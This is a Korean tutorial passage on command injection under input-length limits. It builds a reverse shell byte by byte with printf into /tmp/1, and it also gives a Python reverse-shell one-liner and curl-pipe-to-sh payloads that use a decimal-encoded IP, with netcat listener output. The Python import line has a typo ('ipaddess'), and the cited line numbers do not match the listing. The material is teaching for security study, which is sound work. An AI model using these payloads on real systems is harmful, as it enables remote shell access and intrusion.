입력 길이가 제한된 상황 :
    입력 길이가 제한된 상황에선 앞서 배운 append redirection을 이용해 사용자가 쓰기 권한을 갖고 있는 임시 폴더에 파일을 만드는 방법으로 활용할 수 있습니다. 
    한 글자씩 원하는 문자를 파일에 저장한 후 bash나 python과 같은 인터프린터를 이용해 실행하는 방식입니다.

    아래 명령어들은 입력 길이가 제한된 상황에서 공격자의 서버와 리버스 연결을 맺는 예제입니다.
    ex)
        printf bas>/tmp/1
        printf h>>/tmp/1
        printf \<>>/tmp/1
        printf /d>>/tmp/1
        printf ev>>/tmp/1
        printf /t>>/tmp/1
        printf cp>>/tmp/1
        printf />>/tmp/1
        printf 1 >>/tmp/1
        printf 2 >>/tmp/1
        printf 7.>>/tmp/1
        printf 0.>>/tmp/1
        printf 0.>>/tmp/1
        printf 1/>>/tmp/1
        printf 1 >>/tmp/1
        printf 2 >>/tmp/1
        printf 3 >>/tmp/1
        printf 4 >>/tmp/1
        bash</tmp/1&

        Line 7~24: 공격자의 원하는 입력을 1~3 바이트씩 입력합니다. 이를 통해 /tmp/1 파일에는 bash</dev/tcp/127.0.0.1/1234의 데이터가 입력됩니다.

        Line 21~24: 숫자 뒤에 스페이스를 추가한 이유는 file descriptor로 인식되지 않기 위해서 입니다.

        Line 25: /tmp/1의 내용을 stdin으로 bash를 실행하여 리버스 쉘을 맺을 수 있습니다.
    ex)
        $ nc -l -p 1234 -k -v
        Listening on [0.0.0.0] (family 0, port 1234)
        Connection from 127.0.0.1 52536 received!
        bash>&0 2>&0
        id
        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)

        Line 1~2: 1234 포트로 tcp 연결을 기다리는 nc 명령어입니다.

        Line 3: 연결이 맺어짐을 알려줍니다.

        Line 4: stdout과 stderr를 0번 fd(socket)로 redirection 시키는 bash를 생성합니다.
        이를 통해 원격의 데이터를 현재 소켓으로 출력할 수 있습니다.

    네트워크를 통해 사용할 명령어를 전송하는 방법도 존재합니다.

    IP Address를 더욱 짧게 입력하기 위한 방법으로는 짧은 길이의 도메인을 사용하거나, ip2long 등이 있습니다.

    IP Address는 long 형식으로 변환이 가능하고 다양한 어플리케이션에서 사용이 가능합니다.

    아래 코드 외에도 다양한 방법을 통해 변환할 수 있습니다.
    ex)
        #!/usr/bin/python3
        import ipaddess
        int(ipaddress.IPv4Address("127.0.0.1")) # 2130706433

    네트워크를 통해 공격 시 먼저 Command Injection 취약점이 발생하는 쉘이 최종적으로 실행할 명령어가 포함된 페이지를 작성합니다.
    ex) index.html
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); 
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

    네트워크 도구(curl, wget 등)를 통해 외부 서버에 존재하는 index.html를 다운받아 실행할 수 있도록 메타 문자를 설정할 수 있습니다.
    ex)
        curl 2130706433|sh
        $(curl 2130706433)
        `curl 2130706433`

    위 명령어가 성공적으로 실행하게 되면 아래와 같이 리버스 쉘이 실행되는 것을 확인할 수 있습니다.
    ex)
        $ nc -l -p 1234 -k -v
        Listening on [0.0.0.0] (family 0, port 1234)
        Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 53220)
        $ id
        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
        $ 
















